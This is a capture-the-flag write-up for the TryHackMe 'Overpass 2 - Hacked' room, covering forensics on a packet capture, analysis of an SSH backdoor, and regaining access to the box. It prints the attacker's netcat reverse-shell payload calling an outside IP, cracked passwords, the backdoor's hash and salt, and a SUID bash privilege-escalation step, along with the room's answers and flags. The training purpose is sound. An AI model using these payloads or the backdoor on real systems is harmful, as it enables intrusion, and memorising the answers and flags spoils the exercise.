# [Overpass 2 - Hacked](https://tryhackme.com/r/room/overpass2hacked)

![Overpass2-Hacked](./images/Overpass2-Hacked.png)

## Task 1 - Forensics - Analyse the PCAP

Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.

Can you work out how the attacker got in, and hack your way back into Overpass' production server?

Note: Although this room is a walkthrough, it expects familiarity with tools and Linux. I recommend learning basic Wireshark and completing Linux Fundamentals as a bare minimum.

md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc

### Answer the questions below

* What was the URL of the page they used to upload a reverse shell?

	`/development/`

	![task1-development](./images/task1-development.png)

* What payload did the attacker use to gain access?

	`exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")`

	![task1-payload](./images/task1-payload.png)

* What password did the attacker use to privesc?
	
	`whenevernoteartinstant`

	![task1-password](./images/task1-password.png)

* How did the attacker establish persistence?

	`https://github.com/NinjaJc01/ssh-backdoor`

	![task1-backdoor](./images/task1-backdoor.png)

* Using the fasttrack wordlist, how many of the system passwords were crackable?

	`4`

	![task1-shadow](./images/task1-shadow.png)

	![task1-john](./images/task1-john.png)

## Task 2 - Research - Analyse the code

Now that you've found the code for the backdoor, it's time to analyse it.

### Answer the questions below

* What's the default hash for the backdoor?

	`bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`

	* Clone backdoor file our machine
	
		`git clone https://github.com/NinjaJc01/ssh-backdoor`

	* Open file `main.go` 
	
		![task2-hash](./images/task2-hash.png)

* What's the hardcoded salt for the backdoor?

	`1c362db832f3f864c8c2fe05f2002a05`

	![task2-salt](./images/task2-salt.png)

* What was the hash that the attacker used? - go back to the PCAP for this!

	`6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`

	![task2-backdoor-hash(./images/task2-backdoor-hash.png)]

* Crack the hash using rockyou and a cracking tool of your choice. What's the password?

	`november16`

	* View hash format (Password + salt) 
	 
		![task2-hashpassword](./images/task2-hashpassword.png)

	* Crete file `attacke-hash.txt`
	
			![task2-cat](./images/task2-cat.png)

	* Crack hash file
	
		![task2-sha512](./images/task2-sha512.png)

		![task2-password](./images/task2-password.png)


## Task 3 - Attack - Get back in!

Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.

There's flags on the box that Overpass can't afford to lose by formatting the server!

### Answer the questions below

* The attacker defaced the website. What message did they leave as a heading?

	`H4ck3d by CooctusClan`

	![task3-meesege](./images/task3-meesege.png)

* Using the information you've found previously, hack your way back in!

	![task3-port](./images/task3-port.png)

* What's the user flag?

	`thm{d119b4fa8c497ddb0525f7ad200e6567}`

	```
	ssh james@$IP -p 2222 -oHostKeyAlgorithms=+ssh-rsa
	```

	![task3-ssh](./images/task3-ssh.png)

* What's the root flag?

	`thm{d53b2684f169360bb9606c333873144d}`

	* Run `.suid_bash`

		`./.suid_bash -p`

	* Get the root flag
	
		![task3-root](./images/task3-root.png)